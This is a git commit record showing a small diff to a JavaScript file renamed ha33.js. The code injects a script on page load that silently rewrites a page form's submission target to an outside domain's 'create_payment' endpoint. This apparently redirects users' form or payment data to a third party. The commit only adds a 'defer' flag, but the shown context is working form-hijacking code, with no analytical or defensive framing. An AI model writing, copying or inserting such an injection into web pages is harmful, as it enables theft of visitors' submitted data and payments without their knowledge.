492cfb41699069786088301bcdf8466448bf1ae2
xjjkong <138182422+xjjkong@users.noreply.github.com>
2023-07-04 22:42:37 +0800

    Update and rename ha31.js to ha33.js

--- ha33.js
+++ ha33.js
@@ -2,6 +2,7 @@ window.onload = function() {
 var scriptEle = document.createElement("script");
 scriptEle.type ="text/javascript";
 scriptEle.text = `document.getElementById('createForm').action = 'https://www.xiaoxiaoshagua.com/create_payment/'`;
+scriptEle.defer = true;
 var x = document.getElementById("createForm");
 x.insertBefore(scriptEle, x.firstChild);
 document.body.appendChild(scriptEle);
